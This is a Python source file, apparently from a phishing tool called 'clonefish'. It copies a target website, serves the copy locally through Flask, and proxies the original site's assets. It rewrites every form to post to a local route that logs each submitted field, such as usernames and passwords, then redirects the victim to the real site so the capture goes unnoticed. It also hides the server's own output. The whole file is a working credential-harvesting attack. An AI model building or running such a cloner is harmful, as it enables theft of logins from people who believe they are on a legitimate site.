
from clonefish.options import Options
from clonefish.utils import is_valid_url, throw_error

from bs4 import BeautifulSoup
from loguru import logger

from urllib.parse import urlparse
import urllib

from flask import Flask, request, redirect, Response

import logging
import click

import requests

# TODO: inherit from a parent class called "Provider"
class ExternalProvider:
    options: Options

    host = "127.0.0.1"
    port = 3000

    def __init__(self, options: Options) -> None:
        self.options = options

    def execute(self):
        url = self.options.external_opts['url']
        parsed_url = urlparse(url)

        base_url = f"http://{self.host}:{self.port}/get_assets"

        if not is_valid_url(url):
            throw_error(f"'{url}' is not a valid URL!")

        logger.info(f"Fetching website contents from '{url }'")

        try:
            response = requests.get(url)
        except Exception as e:
            throw_error(f"found an error while fetching website: {e}")

        soup = BeautifulSoup(response.content, 'html.parser')
        for form in soup.find_all('form'):
            form['action'] = "/action"

        for script in soup.find_all('link'):
            if script.get("href", None):
                script['href'] = base_url + "?url=" + urllib.parse.quote_plus(script['href'][1:]) + ("&base=" + urllib.parse.quote_plus(parsed_url.scheme + '://' + parsed_url.netloc + "/")) if script['href'].startswith("/") else base_url + "?url=" + urllib.parse.quote_plus(script['href']) + ("&base=" + urllib.parse.quote_plus(parsed_url.scheme + '://' + parsed_url.netloc + "/"))

        for script in soup.find_all('script'):
            if script.get("src", None):
                script['src'] = base_url + "?url=" + urllib.parse.quote_plus(script['src'][1:]) + ("&base=" + urllib.parse.quote_plus(parsed_url.scheme + '://' + parsed_url.netloc + "/")) if script['src'].startswith("/") else base_url + "?url=" + urllib.parse.quote_plus(script['src']) + ("&base=" + urllib.parse.quote_plus(parsed_url.scheme + '://' + parsed_url.netloc + "/"))

        soup.head.append(soup.new_tag("base", href=base_url))
        self.serve(str(soup), url)

    def serve(self, html: str, url: str):
        app = Flask(__name__)

        # ignore flask messages!
        log = logging.getLogger('werkzeug')
        log.disabled = True

        def secho(text, file=None, nl=None, err=None, color=None, **styles):
            pass

        def echo(text, file=None, nl=None, err=None, color=None, **styles):
            pass

        click.echo = echo
        click.secho = secho

        @app.route('/')
        def home():
            return html

        @app.route('/action', methods = ['POST'])
        def action():
            logger.info("-----------------")
            logger.info("new action has been triggered")

            for v in request.form:
                logger.info("  - %s : %s" % (v,request.form[v]))

            logger.info("-----------------")

            return redirect(url)

        @app.route('/<path:path>')
        def fake_me(path: str):
            print(url + path)
            req = requests.get(url + path)
            return Response(req.content, mimetype=req.headers['Content-Type'], status=req.status_code)


        @app.route('/get_assets')
        def get_assets():
            parsed_url = urlparse(request.args.get("url"))
            if parsed_url.scheme != "" and parsed_url.netloc != "":
                req = requests.get(request.args.get("url"))
            else:
                req = requests.get(request.args.get("base", "/") + request.args.get("url"))

            return Response(req.content, mimetype=req.headers['Content-Type'], status=req.status_code)

        logger.info(f"Application runing at: http://{self.host}:{self.port}")
        app.run(host=self.host, port=self.port)


